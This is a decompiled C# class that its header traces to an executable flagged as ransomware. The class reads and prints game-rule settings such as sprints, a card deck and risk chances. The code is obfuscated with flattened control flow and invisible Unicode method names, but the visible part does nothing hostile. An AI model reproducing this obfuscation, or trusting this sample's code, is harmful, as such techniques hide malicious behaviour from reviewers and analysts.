// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Rules
// Assembly: SecurityContextSwitch, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: B550A3E4-7AB3-42E5-BA1E-9838306CED9A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-633b443e56df746071e4f5c91d3f721ff0886afac579db94deaef37dc64fde58.exe

using SimpleJSON;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Rules
  {
    public int SprintCount { get; private set; }

    public int MaxImpact { get; private set; }

    public Card[] Cards { get; private set; }

    public int InitialResources { get; private set; }

    public int NormalPlanningCount { get; private set; }

    public int NormalPlanningCost { get; private set; }

    public int OverPlanningCost { get; private set; }

    public int SprintsWonWithoutPlanning { get; private set; }

    public float[] RiskChances { get; private set; }

    public bool EconomicsAffectsAll { get; private set; }

    public int StayOnSprintMinDiff { get; private set; }

    public bool OnlyOneWinner { get; private set; }

    private Rules()
    {
label_1:
      int num1 = -640484992;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -2100522607)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * 1864132870 ^ -1324479307;
            continue;
          case 2:
            num1 = (int) num2 * 1271054396 ^ 43515550;
            continue;
          case 3:
            goto label_3;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:;
    }

    public static Rules Deserialize(JSONNode json)
    {
label_1:
      int num1 = -737159687;
      int asInt;
      Rules rules;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -653119974)) % 4U)
        {
          case 0:
            rules = new Rules()
            {
              SprintCount = json["sprints"].AsInt,
              MaxImpact = asInt,
              Cards = Rules.ParseDeck(json["deck"], asInt),
              InitialResources = json["initial-resources"].AsInt,
              NormalPlanningCount = json["normal-planning-count"].AsInt,
              NormalPlanningCost = json["normal-planning-cost"].AsInt,
              OverPlanningCost = json["over-planning-cost"].AsInt,
              SprintsWonWithoutPlanning = json["sprints-won-without-planning"].AsInt,
              RiskChances = Rules.ParseRiskChances(json["risk-chances"]),
              EconomicsAffectsAll = json["economics-affects-all"].AsBool,
              StayOnSprintMinDiff = json["stay-on-sprint-min-diff"].AsInt,
              OnlyOneWinner = json["only-one-winner"].AsBool
            };
            num1 = (int) num2 * 150172546 ^ -1503736081;
            continue;
          case 2:
            goto label_1;
          case 3:
            asInt = json["max-impact"].AsInt;
            num1 = (int) num2 * -199067358 ^ 59801372;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return rules;
    }

    private static float[] ParseRiskChances(JSONNode json)
    {
label_1:
      int num1 = 124850472;
      float[] numArray;
      int aIndex;
      float[] riskChances;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 2065488623)) % 9U)
        {
          case 0:
            riskChances = numArray;
            num1 = (int) num2 * -1166002278 ^ -2011948069;
            continue;
          case 2:
            goto label_1;
          case 3:
            ++aIndex;
            num1 = (int) num2 * -1215572449 ^ -1929246073;
            continue;
          case 4:
            int num3;
            num1 = num3 = aIndex < numArray.Length ? 433222001 : (num3 = 1461384110);
            continue;
          case 5:
            num1 = (int) num2 * -1264852511 ^ 1346793203;
            continue;
          case 6:
            numArray[aIndex] = json[aIndex].AsFloat;
            num1 = 2143662612;
            continue;
          case 7:
            aIndex = 0;
            num1 = (int) num2 * 1699085636 ^ -2019587862;
            continue;
          case 8:
            numArray = new float[json.Count];
            num1 = (int) num2 * -440639435 ^ -929675458;
            continue;
          default:
            goto label_10;
        }
      }
label_10:
      return riskChances;
    }

    private static Card[] ParseDeck(JSONNode json, int maxImpact)
    {
      int count = json.Count;
label_1:
      int num1 = -1894935312;
      int aIndex1;
      int aIndex2;
      int num2;
      List<Card> cardList;
      bool flag1;
      bool flag2;
      JSONNode jsonNode;
      Card[] array;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (num1 ^ -490556905)) % 24U)
        {
          case 1:
            aIndex2 = 0;
            num1 = (int) num3 * -1149832019 ^ -446451158;
            continue;
          case 2:
            num1 = (int) num3 * -1657386382 ^ -367301812;
            continue;
          case 3:
            cardList.Add(new Card()
            {
              Impact = flag1 ? -(maxImpact - aIndex1) : maxImpact * 2 - aIndex1,
              Type = aIndex2
            });
            num1 = -272389435;
            continue;
          case 4:
            ++aIndex1;
            num1 = (int) num3 * -368018376 ^ 883755161;
            continue;
          case 5:
            aIndex1 = 0;
            num1 = (int) num3 * -1937479167 ^ -2036168069;
            continue;
          case 6:
            int num4;
            num1 = num4 = aIndex2 >= count ? -1626257499 : (num4 = -1540958920);
            continue;
          case 7:
            jsonNode = json[aIndex2];
            num1 = -1522028718;
            continue;
          case 8:
            num1 = (int) num3 * -741795769 ^ -2066112695;
            continue;
          case 9:
            num1 = (int) num3 * 86114649 ^ 910070456;
            continue;
          case 10:
            flag1 = aIndex1 < maxImpact;
            num1 = (int) num3 * 773500200 ^ 1551334900;
            continue;
          case 11:
            num1 = -531799059;
            continue;
          case 12:
            num1 = (int) num3 * 1047176242 ^ 1254217979;
            continue;
          case 13:
            num1 = (int) num3 * -1574492036 ^ 1690347966;
            continue;
          case 14:
            int num5 = flag2 ? -975360448 : (num5 = -1723003209);
            num1 = num5 ^ (int) num3 * -1644164598;
            continue;
          case 15:
            cardList = new List<Card>();
            num1 = (int) num3 * 1343385722 ^ 675794432;
            continue;
          case 16:
            num1 = -64440434;
            continue;
          case 17:
            num2 = 0;
            num1 = (int) num3 * -1746861753 ^ 16335221;
            continue;
          case 18:
            array = cardList.ToArray();
            num1 = (int) num3 * 39996745 ^ -1859377859;
            continue;
          case 19:
            ++aIndex2;
            num1 = (int) num3 * 2116528676 ^ -571619723;
            continue;
          case 20:
            goto label_1;
          case 21:
            flag2 = num2 < jsonNode[aIndex1].AsInt;
            num1 = -1199304335;
            continue;
          case 22:
            int num6;
            num1 = num6 = aIndex1 < maxImpact * 2 ? -1550420537 : (num6 = -1244138804);
            continue;
          case 23:
            ++num2;
            num1 = (int) num3 * 1080367027 ^ -982188257;
            continue;
          default:
            goto label_25;
        }
      }
label_25:
      return array;
    }

    public override string ToString()
    {
      string str = Rules.\u200E‮‍⁯‪⁯⁫‭‭⁮‍‌⁬‎​⁫‮‎‎⁫⁫⁬‬‍​‫⁬⁬‫‬‏‫‎⁬⁭⁬⁫‪⁭‭‮("sprints: {0},\nmax-impact:{1},\ndeck: \n{2},\n\ninitial-resources: {3},\n\nnormal-planning-count: {4},\nnormal-planning-cost: {5},\nover-planning-cost: {6},\nsprints-won-without-planning: {7},\n\nrisk-chances: {8},\n\neconomics-affects-all: {9},\nstay-on-sprint-min-diff: {10},\nonly-one-winner: {11}", new object[12]
      {
        (object) this.SprintCount,
        (object) this.MaxImpact,
        (object) this.CardsToString(),
        (object) this.InitialResources,
        (object) this.NormalPlanningCount,
        (object) this.NormalPlanningCost,
        (object) this.OverPlanningCost,
        (object) this.SprintsWonWithoutPlanning,
        (object) this.RiskChancesToString(),
        (object) this.EconomicsAffectsAll,
        (object) this.StayOnSprintMinDiff,
        (object) this.OnlyOneWinner
      });
label_1:
      int num1 = -1352830613;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -3714109)) % 3U)
        {
          case 1:
            num1 = (int) num2 * -1068841279 ^ 1475767724;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_4;
        }
      }
label_4:
      return str;
    }

    private string CardsToString()
    {
      string str1 = "[\n\t";
      int num1 = 0;
label_1:
      int num2 = 578714953;
      Card card1;
      int index;
      Card[] cards;
      string str2;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (num2 ^ 2055500468)) % 14U)
        {
          case 1:
            index = 0;
            num2 = (int) num3 * 539937264 ^ 278532965;
            continue;
          case 2:
            int num4;
            num2 = num4 = index < cards.Length ? 479015064 : (num4 = 1788843087);
            continue;
          case 3:
            num2 = (int) num3 * 1516993740 ^ -1820541784;
            continue;
          case 4:
            ++index;
            num2 = (int) num3 * 1921819180 ^ 170735940;
            continue;
          case 5:
            cards = this.Cards;
            num2 = (int) num3 * 1623375821 ^ -1838940560;
            continue;
          case 6:
            goto label_1;
          case 7:
            num2 = (int) num3 * -2007954554 ^ 931703298;
            continue;
          case 8:
            card1 = cards[index];
            num2 = 787779166;
            continue;
          case 9:
            str2 = Rules.\u206B‌‮⁭⁭​‎⁬‪‎‍​⁪‌⁪⁭⁬‫‌‮‌⁮⁮‎⁯‎‍‬⁫‎⁮‍‏‭‬‌⁪⁭‮‪‮(str1, "\n]");
            num2 = (int) num3 * -1412289779 ^ -1143177064;
            continue;
          case 10:
            int num5 = num1 == card1.Type ? 441502525 : (num5 = 1374330594);
            num2 = num5 ^ (int) num3 * -205914714;
            continue;
          case 11:
            num2 = (int) num3 * -488119902 ^ -1188500634;
            continue;
          case 12:
            str1 = Rules.\u206B‌‮⁭⁭​‎⁬‪‎‍​⁪‌⁪⁭⁬‫‌‮‌⁮⁮‎⁯‎‍‬⁫‎⁮‍‏‭‬‌⁪⁭‮‪‮(str1, "\n\t");
            num1 = card1.Type;
            num2 = (int) num3 * 1761940019 ^ 1367184159;
            continue;
          case 13:
            string str3 = str1;
            Card card2 = card1;
            string str4 = card2 != null ? Rules.\u200E‫⁫⁭‮⁬‬⁭‫⁫‭⁭⁬⁫‍​‭​‭⁪‪⁯‍⁮‎‍‬⁮‎‭‬⁫‬⁫⁮‏⁭‍‎⁬‮((object) card2) : (string) null;
            str1 = Rules.\u206A⁬⁬‬​‪‭‭⁬‎‎‭⁬⁭⁫‭​⁮‮‫⁭⁮‏​‫‮​⁮‭‫‪‭⁮⁫‬⁫​⁮‏⁬‮(str3, str4, " ");
            num2 = 1663534593;
            continue;
          default:
            goto label_15;
        }
      }
label_15:
      return str2;
    }

    private string RiskChancesToString()
    {
      string str1 = Rules.\u206B‌‮⁭⁭​‎⁬‪‎‍​⁪‌⁪⁭⁬‫‌‮‌⁮⁮‎⁯‎‍‬⁫‎⁮‍‏‭‬‌⁪⁭‮‪‮("[ ", this.RiskChances[0].ToString((IFormatProvider) Rules.\u202D⁫​⁯‌⁪​⁬‍​‏‬‬​⁬‏‫‌‏‪‎‭‬‏‬‮‍‭⁯⁯‭‪​‮⁪​‭‫‍‏‮()));
label_1:
      int num1 = -810015400;
      int index;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1377192723)) % 8U)
        {
          case 0:
            ++index;
            num1 = (int) num2 * -1028133306 ^ 621514428;
            continue;
          case 1:
            int num3;
            num1 = num3 = index < this.RiskChances.Length ? -1203107701 : (num3 = -918759721);
            continue;
          case 2:
            str2 = Rules.\u206B‌‮⁭⁭​‎⁬‪‎‍​⁪‌⁪⁭⁬‫‌‮‌⁮⁮‎⁯‎‍‬⁫‎⁮‍‏‭‬‌⁪⁭‮‪‮(str1, " ]");
            num1 = (int) num2 * -397599284 ^ 228853713;
            continue;
          case 4:
            num1 = (int) num2 * -1004952545 ^ 875359418;
            continue;
          case 5:
            index = 1;
            num1 = (int) num2 * 411471135 ^ -1375857497;
            continue;
          case 6:
            str1 = Rules.\u206A⁬⁬‬​‪‭‭⁬‎‎‭⁬⁭⁫‭​⁮‮‫⁭⁮‏​‫‮​⁮‭‫‪‭⁮⁫‬⁫​⁮‏⁬‮(str1, ", ", this.RiskChances[index].ToString((IFormatProvider) Rules.\u202D⁫​⁯‌⁪​⁬‍​‏‬‬​⁬‏‫‌‏‪‎‭‬‏‬‮‍‭⁯⁯‭‪​‮⁪​‭‫‍‏‮()));
            num1 = -1870772411;
            continue;
          case 7:
            goto label_1;
          default:
            goto label_9;
        }
      }
label_9:
      return str2;
    }

    static string \u200E‮‍⁯‪⁯⁫‭‭⁮‍‌⁬‎​⁫‮‎‎⁫⁫⁬‬‍​‫⁬⁬‫‬‏‫‎⁬⁭⁬⁫‪⁭‭‮([In] string obj0, [In] object[] obj1) => string.Format(obj0, obj1);

    static string \u206B‌‮⁭⁭​‎⁬‪‎‍​⁪‌⁪⁭⁬‫‌‮‌⁮⁮‎⁯‎‍‬⁫‎⁮‍‏‭‬‌⁪⁭‮‪‮([In] string obj0, [In] string obj1) => obj0 + obj1;

    static string \u200E‫⁫⁭‮⁬‬⁭‫⁫‭⁭⁬⁫‍​‭​‭⁪‪⁯‍⁮‎‍‬⁮‎‭‬⁫‬⁫⁮‏⁭‍‎⁬‮([In] object obj0) => obj0.ToString();

    static string \u206A⁬⁬‬​‪‭‭⁬‎‎‭⁬⁭⁫‭​⁮‮‫⁭⁮‏​‫‮​⁮‭‫‪‭⁮⁫‬⁫​⁮‏⁬‮(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2)
    {
      return obj0 + obj1 + obj2;
    }

    static CultureInfo \u202D⁫​⁯‌⁪​⁬‍​‏‬‬​⁬‏‫‌‏‪‎‭‬‏‬‮‍‭⁯⁯‭‪​‮⁪​‭‫‍‏‮() => CultureInfo.InvariantCulture;
  }
}
